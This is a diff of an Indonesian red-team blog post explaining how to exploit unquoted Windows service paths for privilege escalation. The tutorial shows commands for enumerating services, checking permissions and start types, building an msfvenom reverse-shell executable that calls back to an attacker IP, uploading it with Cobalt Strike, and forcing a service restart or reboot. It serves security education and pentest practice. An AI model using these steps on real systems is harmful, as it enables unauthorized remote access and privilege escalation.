@@ -1,10 +1,11 @@
 ---
-title: 'Unquoted Service Paths'
+title: '[Misconfig] Unquoted Service Paths'
 date: 2022-05-29 14:15:22 +0700
 categories: [Privilege Escalation, Windows Privilege Escalation]
-tags: [windows, privilege escalation]     # TAG names should always be lowercase
+tags: [red team, privilege escalation, windows hacking, windows privilege escalation]     # TAG names should always be lowercase
 author: nairpaa
 ---
+
 
 **Unquoted Service Paths** adalah ketika PATH binary dari suatu layanan mengandung spasi dengan tidak menggunakan kutip. 
 
@@ -13,31 +14,48 @@ Contoh dari **Unquoted Service Paths** adalah `C:\Program Files\Ignite Data\Vuln
 Untuk mengakses `file.exe`, sistem akan membaca jalur PATH dalam urutan seperti berikut:
 
 ```powershell
-C:\Program.exe #percobaan akses 1
-C:\Program Files\Ignite.exe #percobaan akses 2
-C:\Program Files\Ignite Data\Vuln.exe #percobaan akses 3
-C:\Program Files\Ignite Data\Vuln Service\file.exe #percobaan akses 4
+C:\Program.exe # Percobaan akses 1
+C:\Program Files\Ignite.exe # Percobaan akses 2
+C:\Program Files\Ignite Data\Vuln.exe # Percobaan akses 3
+C:\Program Files\Ignite Data\Vuln Service\file.exe # Percobaan akses 4
 ```
 
 Jika kita memiliki hak akses *write* pada `C:\Program Files\Ignite Data\`, kita dapat menyisipkan *malicious file executable* (`C:\Program Files\Ignite Data\Vuln.exe`) untuk dijalankan oleh user yang menjalankan service tersebut.
 
-## Tahapan Eksploitasi
+## 0x1 - Exploitation Stages
 
-### Step 1: Cek service paths
+### Step 1: Check the Service Path
 
-Tools:
-- Winpeas
-- PowerUp.ps1
-
-Manual:
+**Tools**:
+- [SharpUp](https://github.com/GhostPack/SharpUp)
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+- [WinPEAS](https://github.com/carlospolop/PEASS-ng/)
 
 ```powershell
-PS > wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+# list service manual menggunakan powershell
+PS > wmic service get name,pathname
+
+# PowerUp.ps1
+PS > . .\PowerUp.ps1
+PS > Get-UnquotedService
+
+# WinPEAS
+PS > .\winpeas.exe
+
+# SharpUp
+PS > .\SharpUp.exe audit UnquotedServicePath
 ```
 
-### Step 2: Cek start type
+### Step 2: Check File and Directory Permissions
 
-Contoh kali ini *start type*-nya  adalah *auto start*.
+```powershell
+PS > Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
+```
+
+### Step 3: Check Start Type
+
+Contoh kali ini *start type*-nya adalah `auto start`.
+
 ```powershell
 PS C:\Users\Ap> sc qc FoxitCloudUpdateService
 sc qc FoxitCloudUpdateService
@@ -56,16 +74,23 @@ SERVICE_NAME: FoxitCloudUpdateService
 ```
 
 
-### Step 3: Buat file .exe dan upload ke service path
+### Step 3: Create Malware and Upload to Service Path
 
 ```bash
-➜ lpe msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
+# Contoh buat malware dengan MSF
+➜ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.73 LPORT=80 -f exe -o Foxit.exe  
+```
+
+```powershell
+# Contoh upload file pada Cobalt Strike
+beacon> upload C:\Payloads\tcp-local_x64.svc.exe
+beacon> mv tcp-local_x64.svc.exe Service.exe
 ```
 
 Contoh: **Foxit.exe** disimpan di "`C:\Program Files (x86)\Foxit Software`".
 
 ```powershell
-C:\Program Files (x86)\Foxit Software>dir
+C:\Program Files (x86)\Foxit Software> dir
 dir
  Volume in drive C is HDD
  Volume Serial Number is DC74-4FCB
@@ -80,17 +105,20 @@ dir
                3 Dir(s)  13,053,509,632 bytes free
 ```
 
-### Step 4: Jalankan service
+### Step 4: Run the Service
 
 ```powershell
-C:\Program Files (x86)\Foxit Software> sc start <service> # jika punya hak akses start service
-C:\Program Files (x86)\Foxit Software> shutdown /r /t 10 # jika autorun, retart + delay 10 detik
+# Jika punya hak akses start service
+C:\> sc start <service> 
+
+# Jika autorun, restart komputer (retart + delay 10 detik)
+C:\> shutdown /r /t 10 
 ```
 
 
 ---
 
-### Referensi
+## 0x2 - References
 
 - https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae
 - [Foxit Reader 7.0.6.1126](https://www.exploit-db.com/exploits/36390)
